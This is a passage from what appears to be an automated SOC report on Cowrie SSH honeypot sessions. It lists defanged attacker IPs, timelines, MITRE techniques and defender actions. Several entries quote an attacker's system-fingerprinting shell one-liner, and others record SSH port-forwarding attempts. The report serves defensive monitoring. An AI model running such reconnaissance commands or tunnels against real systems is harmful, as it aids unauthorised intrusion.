| `2026-08-29 13:21:41` | `cowrie.client.version` |
| `2026-08-29 13:21:41` | `cowrie.client.kex` |
| `2026-08-29 13:21:41` | `cowrie.login.success` |
| `2026-08-29 13:21:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.97.200[.]219` to AbuseIPDB if not already reported
- [ ] Block `174.97.200[.]219` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b51dc398d52d

| Field | Detail |
|---|---|
| **Source IP** | `174.97.200[.]219` |
| **First Seen** | 2026-08-29 13:21 |
| **Last Seen** | 2026-08-29 13:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:21:41` | `cowrie.session.connect` |
| `2026-08-29 13:21:41` | `cowrie.client.version` |
| `2026-08-29 13:21:41` | `cowrie.client.kex` |
| `2026-08-29 13:21:41` | `cowrie.login.success` |
| `2026-08-29 13:21:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.97.200[.]219` to AbuseIPDB if not already reported
- [ ] Block `174.97.200[.]219` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23af7672cda9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:22 |
| **Last Seen** | 2026-08-29 13:23 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:22:52` | `cowrie.session.connect` |
| `2026-08-29 13:22:54` | `cowrie.client.version` |
| `2026-08-29 13:22:54` | `cowrie.client.kex` |
| `2026-08-29 13:23:02` | `cowrie.login.success` |
| `2026-08-29 13:23:07` | `cowrie.session.params` |
| `2026-08-29 13:23:07` | `cowrie.command.input` |
| `2026-08-29 13:23:07` | `cowrie.command.input` |
| `2026-08-29 13:23:07` | `cowrie.command.input` |
| `2026-08-29 13:23:07` | `cowrie.command.input` |
| `2026-08-29 13:23:07` | `cowrie.command.input` |
| `2026-08-29 13:23:07` | `cowrie.command.success` |
| `2026-08-29 13:23:07` | `cowrie.command.input` |
| `2026-08-29 13:23:07` | `cowrie.command.input` |
| `2026-08-29 13:23:07` | `cowrie.command.input` |
| `2026-08-29 13:23:07` | `cowrie.command.input` |
| `2026-08-29 13:23:09` | `cowrie.log.closed` |
| `2026-08-29 13:23:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c1e47a3970f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:24 |
| **Last Seen** | 2026-08-29 13:24 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:24:40` | `cowrie.session.connect` |
| `2026-08-29 13:24:42` | `cowrie.client.version` |
| `2026-08-29 13:24:42` | `cowrie.client.kex` |
| `2026-08-29 13:24:49` | `cowrie.login.success` |
| `2026-08-29 13:24:54` | `cowrie.session.params` |
| `2026-08-29 13:24:54` | `cowrie.command.input` |
| `2026-08-29 13:24:54` | `cowrie.command.input` |
| `2026-08-29 13:24:54` | `cowrie.command.input` |
| `2026-08-29 13:24:54` | `cowrie.command.input` |
| `2026-08-29 13:24:54` | `cowrie.command.input` |
| `2026-08-29 13:24:54` | `cowrie.command.success` |
| `2026-08-29 13:24:54` | `cowrie.command.input` |
| `2026-08-29 13:24:54` | `cowrie.command.input` |
| `2026-08-29 13:24:54` | `cowrie.command.input` |
| `2026-08-29 13:24:54` | `cowrie.command.input` |
| `2026-08-29 13:24:56` | `cowrie.log.closed` |
| `2026-08-29 13:24:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a0b1245a3e0

| Field | Detail |
|---|---|
| **Source IP** | `182.95.190[.]150` |
| **First Seen** | 2026-08-29 13:26 |
| **Last Seen** | 2026-08-29 13:26 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:26:15` | `cowrie.session.connect` |
| `2026-08-29 13:26:17` | `cowrie.client.version` |
| `2026-08-29 13:26:17` | `cowrie.client.kex` |
| `2026-08-29 13:26:20` | `cowrie.login.success` |
| `2026-08-29 13:26:21` | `cowrie.direct-tcpip.request` |
| `2026-08-29 13:26:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.95.190[.]150` to AbuseIPDB if not already reported
- [ ] Block `182.95.190[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aff6d88044d4

| Field | Detail |
|---|---|
| **Source IP** | `112.30.68[.]155` |
| **First Seen** | 2026-08-29 13:26 |
| **Last Seen** | 2026-08-29 13:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:26:27` | `cowrie.session.connect` |
| `2026-08-29 13:26:27` | `cowrie.client.version` |
| `2026-08-29 13:26:27` | `cowrie.client.kex` |
| `2026-08-29 13:26:30` | `cowrie.login.success` |
| `2026-08-29 13:26:31` | `cowrie.direct-tcpip.request` |
| `2026-08-29 13:26:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.30.68[.]155` to AbuseIPDB if not already reported
- [ ] Block `112.30.68[.]155` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7c2c0440150

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:26 |
| **Last Seen** | 2026-08-29 13:26 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:26:29` | `cowrie.session.connect` |
| `2026-08-29 13:26:30` | `cowrie.client.version` |
| `2026-08-29 13:26:30` | `cowrie.client.kex` |
| `2026-08-29 13:26:38` | `cowrie.login.success` |
| `2026-08-29 13:26:41` | `cowrie.session.params` |
| `2026-08-29 13:26:41` | `cowrie.command.input` |
| `2026-08-29 13:26:41` | `cowrie.command.input` |
| `2026-08-29 13:26:41` | `cowrie.command.input` |
| `2026-08-29 13:26:41` | `cowrie.command.input` |
| `2026-08-29 13:26:41` | `cowrie.command.input` |
| `2026-08-29 13:26:41` | `cowrie.command.success` |
| `2026-08-29 13:26:41` | `cowrie.command.input` |
| `2026-08-29 13:26:41` | `cowrie.command.input` |
| `2026-08-29 13:26:41` | `cowrie.command.input` |
| `2026-08-29 13:26:41` | `cowrie.command.input` |
| `2026-08-29 13:26:43` | `cowrie.log.closed` |
| `2026-08-29 13:26:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d9ee12b0071

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:28 |
| **Last Seen** | 2026-08-29 13:28 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:28:13` | `cowrie.session.connect` |
| `2026-08-29 13:28:14` | `cowrie.client.version` |
| `2026-08-29 13:28:14` | `cowrie.client.kex` |
| `2026-08-29 13:28:21` | `cowrie.login.success` |
| `2026-08-29 13:28:25` | `cowrie.session.params` |
| `2026-08-29 13:28:25` | `cowrie.command.input` |
| `2026-08-29 13:28:25` | `cowrie.command.input` |
| `2026-08-29 13:28:25` | `cowrie.command.input` |
| `2026-08-29 13:28:25` | `cowrie.command.input` |
| `2026-08-29 13:28:25` | `cowrie.command.input` |
| `2026-08-29 13:28:25` | `cowrie.command.success` |
| `2026-08-29 13:28:25` | `cowrie.command.input` |
| `2026-08-29 13:28:25` | `cowrie.command.input` |
| `2026-08-29 13:28:25` | `cowrie.command.input` |
| `2026-08-29 13:28:25` | `cowrie.command.input` |
| `2026-08-29 13:28:27` | `cowrie.log.closed` |
| `2026-08-29 13:28:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-246804e3f9f6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 13:28 |
| **Last Seen** | 2026-08-29 13:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:28:34` | `cowrie.session.connect` |
| `2026-08-29 13:28:34` | `cowrie.client.version` |
| `2026-08-29 13:28:34` | `cowrie.client.kex` |
| `2026-08-29 13:28:35` | `cowrie.login.success` |
| `2026-08-29 13:28:35` | `cowrie.direct-tcpip.request` |
| `2026-08-29 13:28:35` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 13:28:35` | `cowrie.direct-tcpip.data` |
| `2026-08-29 13:28:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-549c66b0a4dd

| Field | Detail |
|---|---|
| **Source IP** | `65.20.138[.]46` |
| **First Seen** | 2026-08-29 13:29 |
| **Last Seen** | 2026-08-29 13:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:29:56` | `cowrie.session.connect` |
| `2026-08-29 13:29:57` | `cowrie.client.version` |
| `2026-08-29 13:29:57` | `cowrie.client.kex` |
| `2026-08-29 13:29:58` | `cowrie.login.success` |
| `2026-08-29 13:29:59` | `cowrie.direct-tcpip.request` |
| `2026-08-29 13:30:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.138[.]46` to AbuseIPDB if not already reported
- [ ] Block `65.20.138[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-902edbf31f6b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:30 |
| **Last Seen** | 2026-08-29 13:30 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:30:02` | `cowrie.session.connect` |
| `2026-08-29 13:30:03` | `cowrie.client.version` |
| `2026-08-29 13:30:03` | `cowrie.client.kex` |
| `2026-08-29 13:30:12` | `cowrie.login.success` |
| `2026-08-29 13:30:16` | `cowrie.session.params` |
| `2026-08-29 13:30:16` | `cowrie.command.input` |
| `2026-08-29 13:30:16` | `cowrie.command.input` |
| `2026-08-29 13:30:16` | `cowrie.command.input` |
| `2026-08-29 13:30:16` | `cowrie.command.input` |
| `2026-08-29 13:30:16` | `cowrie.command.input` |
| `2026-08-29 13:30:16` | `cowrie.command.success` |
| `2026-08-29 13:30:16` | `cowrie.command.input` |
| `2026-08-29 13:30:16` | `cowrie.command.input` |
| `2026-08-29 13:30:16` | `cowrie.command.input` |
| `2026-08-29 13:30:16` | `cowrie.command.input` |
| `2026-08-29 13:30:19` | `cowrie.log.closed` |
| `2026-08-29 13:30:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04f0fe34fbdc

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 13:30 |
| **Last Seen** | 2026-08-29 13:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:30:39` | `cowrie.session.connect` |
| `2026-08-29 13:30:39` | `cowrie.client.version` |
| `2026-08-29 13:30:40` | `cowrie.client.kex` |
| `2026-08-29 13:30:40` | `cowrie.login.success` |
| `2026-08-29 13:30:41` | `cowrie.direct-tcpip.request` |
| `2026-08-29 13:30:41` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 13:30:41` | `cowrie.direct-tcpip.data` |
| `2026-08-29 13:30:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07ebe77ec430

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:31 |
| **Last Seen** | 2026-08-29 13:32 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:31:54` | `cowrie.session.connect` |
| `2026-08-29 13:31:56` | `cowrie.client.version` |
| `2026-08-29 13:31:56` | `cowrie.client.kex` |
| `2026-08-29 13:32:02` | `cowrie.login.success` |
| `2026-08-29 13:32:05` | `cowrie.session.params` |
| `2026-08-29 13:32:05` | `cowrie.command.input` |
| `2026-08-29 13:32:05` | `cowrie.command.input` |
| `2026-08-29 13:32:05` | `cowrie.command.input` |
| `2026-08-29 13:32:05` | `cowrie.command.input` |
| `2026-08-29 13:32:05` | `cowrie.command.input` |
| `2026-08-29 13:32:05` | `cowrie.command.success` |
| `2026-08-29 13:32:05` | `cowrie.command.input` |
| `2026-08-29 13:32:05` | `cowrie.command.input` |
| `2026-08-29 13:32:05` | `cowrie.command.input` |
| `2026-08-29 13:32:05` | `cowrie.command.input` |
| `2026-08-29 13:32:07` | `cowrie.log.closed` |
| `2026-08-29 13:32:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e48d3bc182ac

| Field | Detail |
|---|---|
| **Source IP** | `43.250.106[.]18` |
| **First Seen** | 2026-08-29 13:32 |
| **Last Seen** | 2026-08-29 13:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:32:32` | `cowrie.session.connect` |
| `2026-08-29 13:32:33` | `cowrie.client.version` |
| `2026-08-29 13:32:33` | `cowrie.client.kex` |
| `2026-08-29 13:32:36` | `cowrie.login.success` |
| `2026-08-29 13:32:37` | `cowrie.direct-tcpip.request` |
| `2026-08-29 13:32:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.250.106[.]18` to AbuseIPDB if not already reported
- [ ] Block `43.250.106[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9717b6a5aa7b

| Field | Detail |
|---|---|
| **Source IP** | `90.70.76[.]142` |
| **First Seen** | 2026-08-29 13:32 |
| **Last Seen** | 2026-08-29 13:32 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:32:42` | `cowrie.session.connect` |
| `2026-08-29 13:32:42` | `cowrie.client.version` |
| `2026-08-29 13:32:42` | `cowrie.client.kex` |
| `2026-08-29 13:32:43` | `cowrie.login.success` |
| `2026-08-29 13:32:43` | `cowrie.direct-tcpip.request` |
| `2026-08-29 13:32:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.70.76[.]142` to AbuseIPDB if not already reported
- [ ] Block `90.70.76[.]142` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27a6987a6f16

| Field | Detail |
|---|---|
| **Source IP** | `197.156.97[.]198` |
| **First Seen** | 2026-08-29 13:32 |
| **Last Seen** | 2026-08-29 13:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:32:50` | `cowrie.session.connect` |
| `2026-08-29 13:32:50` | `cowrie.client.version` |
| `2026-08-29 13:32:50` | `cowrie.client.kex` |
| `2026-08-29 13:32:51` | `cowrie.login.success` |
| `2026-08-29 13:32:52` | `cowrie.direct-tcpip.request` |
| `2026-08-29 13:32:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.97[.]198` to AbuseIPDB if not already reported
- [ ] Block `197.156.97[.]198` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b2d88e616c5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:33 |
| **Last Seen** | 2026-08-29 13:34 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:33:43` | `cowrie.session.connect` |
| `2026-08-29 13:33:45` | `cowrie.client.version` |
| `2026-08-29 13:33:45` | `cowrie.client.kex` |
| `2026-08-29 13:33:52` | `cowrie.login.success` |
| `2026-08-29 13:33:57` | `cowrie.session.params` |
| `2026-08-29 13:33:57` | `cowrie.command.input` |
| `2026-08-29 13:33:57` | `cowrie.command.input` |
| `2026-08-29 13:33:57` | `cowrie.command.input` |
| `2026-08-29 13:33:57` | `cowrie.command.input` |
| `2026-08-29 13:33:57` | `cowrie.command.input` |
| `2026-08-29 13:33:57` | `cowrie.command.success` |
| `2026-08-29 13:33:57` | `cowrie.command.input` |
| `2026-08-29 13:33:57` | `cowrie.command.input` |
| `2026-08-29 13:33:57` | `cowrie.command.input` |
| `2026-08-29 13:33:57` | `cowrie.command.input` |
| `2026-08-29 13:33:58` | `cowrie.log.closed` |
| `2026-08-29 13:34:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dac7242e5aef

| Field | Detail |
|---|---|
| **Source IP** | `75.64.135[.]45` |
| **First Seen** | 2026-08-29 13:34 |
| **Last Seen** | 2026-08-29 13:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:34:41` | `cowrie.session.connect` |
| `2026-08-29 13:34:41` | `cowrie.client.version` |
| `2026-08-29 13:34:41` | `cowrie.client.kex` |
| `2026-08-29 13:34:43` | `cowrie.login.success` |
| `2026-08-29 13:34:43` | `cowrie.direct-tcpip.request` |
| `2026-08-29 13:34:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `75.64.135[.]45` to AbuseIPDB if not already reported
- [ ] Block `75.64.135[.]45` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abb6dd651884

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]59` |
| **First Seen** | 2026-08-29 13:34 |
| **Last Seen** | 2026-08-29 13:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
